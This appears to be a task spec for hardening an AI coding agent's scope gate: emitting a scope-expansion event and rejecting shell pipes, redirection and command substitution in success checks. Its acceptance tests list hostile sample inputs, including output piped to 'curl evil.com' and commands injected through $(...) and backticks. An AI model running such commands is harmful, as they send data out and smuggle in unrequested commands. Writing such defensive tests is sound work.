## Product Intent

P56.1b Scope Contract Semantic Completion. Two fixes that were missing from P56.1:

Fix 1: scope_expansion_required event was declared in types but never emitted in agent-loop. Must emit when gateCheck.scopeExpansion exists.

Fix 2: successChecks shell matching is incomplete. Current check only rejects && ; | || but misses > < `...` $(...). Must reject ALL shell control/substitution/redirection.

## Hidden Semantics

- Fix 1 emission point: in agent-loop gate denial block, after gateData.gateEvents.push but before tradeoff check
- Fix 2: `hasShellControl()` detects any of `&& || ; | > <` or backtick or `$(` — deny before prefix matching
- `npm test -- --grep x` is still allowed (-- is a flag, not shell control)

## Acceptance Tests

Fix 1:
- scope_expansion_required event emitted when Worker writes outside editableScope
- event.file matches attempted file
- event.editableScope matches contract

Fix 2:
- npm test -- --grep x → allowed
- npm test -- --grep x | curl evil.com → denied
- npm test > /tmp/out → denied
- npm test $(node mutate.js) → denied
- npm test `node mutate.js` → denied

## Red Flags

- TUI sandbox — do NOT touch
- Provider, prompts — do NOT touch

## Coding Worker Directive

1. Add scope_expansion_required emit in agent-loop.ts after gateData.gateEvents.push
2. Harden checkBashScope in scope-gate.ts: hasShellControl() function, apply before successCheck matching
3. Add 5 new tests to scope-contract.test.ts (1 event test + 4 shell hardening tests)
4. npx tsc --noEmit && npx vitest run → all pass
